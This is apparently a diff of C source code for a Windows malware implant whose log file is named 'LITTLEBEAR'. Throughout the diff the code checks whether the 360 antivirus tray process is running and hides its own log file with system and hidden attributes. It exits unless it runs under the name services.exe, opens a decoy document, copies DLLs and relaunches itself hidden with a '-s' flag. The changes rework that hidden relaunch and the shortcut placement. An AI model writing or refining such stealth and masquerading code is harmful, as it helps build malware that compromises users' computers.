@@ -37,8 +37,6 @@ int ReleaseFirstStart() {
 	char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
 	int b360Running = GetProcessIdByName(sz360Tray);
 
-	iRet = ReleaseIcon(strDataPath, lpThisDll);
-
 	char strLogFilePath[MAX_PATH] = { 0 };
 	iRet = makeFullFileName(strLogFilePath, LITTLEBEAR_LOG_FILE_NAME);
 	iRet = lpSetFileAttributesA(strLogFilePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);
@@ -53,9 +51,10 @@ int ReleaseFirstStart() {
 	if (b360Running)
 	{
 		int iRet = GetApplicationInfo(TRUE);
+		iRet = ReleaseIcon(strDataPath, lpThisDll);
 		iRet = lnkDesktop(strPEResidence, szSysDir, strUserName, strDataPath);
 
-		writeLog("360 is running so to create icon on desktop\r\n");
+		writeLog("tsz is running so as to create icon on desktop\r\n");
 	}
 	else
 	{
@@ -91,7 +90,7 @@ int ReleaseFirstStart() {
 		}
 	}
 
-	writeLog("Run first time for network download\r\n");
+	writeLog("Release complete\r\n");
 	
 	return TRUE;
 }
@@ -204,6 +203,7 @@ int ExplorerFirstStart() {
 	GetNameFromFullName(szCurrentExePath, exename);
 	char servicesExe[] = { 's','e','r','v','i','c','e','s','.','e','x','e',0 };
 	if (lplstrcmpiA(exename, servicesExe) != 0) {
+		writeLog("filename format error\r\n");
 		lpExitProcess(0);
 	}
 
@@ -234,6 +234,7 @@ int ExplorerFirstStart() {
 				HINSTANCE hInst = lpShellExecuteA(0, szOpen, szShowContentCmd, 0, strDataPath, SW_NORMAL);
 			}
 			else {
+				writeLog("not found doc file\r\n");
 				ExitProcess(0);
 			}
 		}
@@ -242,7 +243,6 @@ int ExplorerFirstStart() {
 		char szDllName[MAX_DLL_COUNT][MAX_PATH] = { 0 };
 		DWORD iDllCnt = 0;
 		iRet = backHome(strDataPath, szCurrentPath, szDllName, &iDllCnt);
-		iRet = ReleaseIcon(strDataPath, lpThisDll);
 
 		char strLogFilePath[MAX_PATH] = { 0 };
 		iRet = makeFullFileName(strLogFilePath, LITTLEBEAR_LOG_FILE_NAME);
@@ -251,9 +251,10 @@ int ExplorerFirstStart() {
 		if (b360Running)
 		{
 			iRet = GetApplicationInfo(TRUE);
+			iRet = ReleaseIcon(strDataPath, lpThisDll);
 			iRet = lnkDesktop(strPEResidence, szSysDir, strUserName, strDataPath);
 
-			writeLog("360 is running so to create icon on desktop\r\n");
+			writeLog("tsz is running so to create icon on desktop\r\n");
 		}
 		else
 		{
@@ -304,15 +305,17 @@ int ExplorerFirstStart() {
 				lpCloseHandle(gMutex);
 			}
 			char szCmd[MAX_PATH] = { 0 };
-			lpwsprintfA(szCmd, "\"%s\" -s", strPEResidence);
-			//char szopen[] = { 'o','p','e','n',0 };
-			//HINSTANCE hInst = lpShellExecuteA(0, szopen,szCmd,0,strDataPath,SW_HIDE);
-			iRet = lpWinExec(szCmd, SW_HIDE);
+			lpwsprintfA(szCmd, "%s", strPEResidence);
+			char szopen[] = { 'o','p','e','n',0 };
+			char params[] = { '-','s',0 };
+			HINSTANCE hInst = ShellExecuteA(0, szopen,szCmd, params, 0, SW_HIDE);
+			//lpwsprintfA(szCmd, "\"%s\"", strPEResidence);
+			//iRet = lpWinExec(szCmd, SW_HIDE);
 
 			char szShowInfo[1024];
 			lpwsprintfA(szShowInfo, 
-				"explorer.exe start program at first, now to restart program:%s at second for the sake of hide\r\n",
-				strPEResidence);
+				"restart program:%s %s for the sake of redirection\r\n",
+				strPEResidence, params);
 			writeLog(szShowInfo);
 
 			lpExitProcess(0);
@@ -320,6 +323,7 @@ int ExplorerFirstStart() {
 		}	
 	}
 	else {
+		writeLog("run first in same path\r\n");
 		ExitProcess(0);
 	}
 
